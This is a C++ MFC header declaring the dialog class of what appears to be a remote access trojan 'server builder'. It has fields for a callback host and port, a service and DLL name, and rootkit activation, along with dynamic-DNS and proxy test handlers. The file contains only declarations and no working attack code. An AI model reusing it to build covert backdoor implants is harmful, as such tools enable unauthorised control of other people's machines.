#if !defined(AFX_BUILDSERVERDLG_H__27979CF3_18A5_4B63_91FC_FB3161673AF2__INCLUDED_)
#define AFX_BUILDSERVERDLG_H__27979CF3_18A5_4B63_91FC_FB3161673AF2__INCLUDED_

#pragma once

#include <afxdialogex.h>

// BuildServerDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CBuildServerDlg dialog
#ifndef __AFXEXT_H__
#include <afxext.h>
#endif
//#include "control/HoverEdit.h"

class CBuildServerDlg : public CDialogEx
{
// Construction
public:
	CBuildServerDlg(CWnd* pParent = NULL);   // standard constructor
	CStatusBar  m_wndStatusBar;


// Dialog Data
	//{{AFX_DATA(CBuildServerDlg)
	enum { IDD = IDD_BuildSer };
	CString	m_url;
	BOOL	m_enable_http;
	CString	m_ServiceDescription;
	CString	m_ServiceDisplayName;
	CString	m_remote_host;
	CString	m_remote_port;
	UINT	m_listen_port;
	UINT	m_max_connections;
	BOOL	m_connect_auto;
	CString	m_dllname;
	CString	m_servicename;
	BOOL	m_bIsSaveAsDefault;
	BOOL	m_bIsRootkit;
	CString	m_beizhu;
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA

private:
	bool m_bFirstShow;
	CButton	m_btn_release;
	CEdit	m_Edit[4];
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CBuildServerDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CBuildServerDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnUp3322();
	afx_msg void OnEnableHttp();
	afx_msg void OnBuild();
	afx_msg void OnTestMaster();
	afx_msg void OnSaveasDefault();
	afx_msg void OnTestProxy();
	afx_msg void OnChangeConfig(UINT id);
	afx_msg void OnResetport();
	afx_msg void OnCheckAuth();
	afx_msg void OnConnectAuto();
	afx_msg void OnDisablePoptips();
	afx_msg void OnCheckProxy();
	afx_msg void OnActiveRootKit();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	static	DWORD WINAPI	TestProxy(LPVOID lparam);
	static	DWORD WINAPI	TestMaster(LPVOID lparam);
	void UpdateProxyControl();
//	bool m_bFirstShow;
//	CHoverEdit	m_Edit[9];
	CButton	m_Btn[3];
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_BUILDSERVERDLG_H__27979CF3_18A5_4B63_91FC_FB3161673AF2__INCLUDED_)
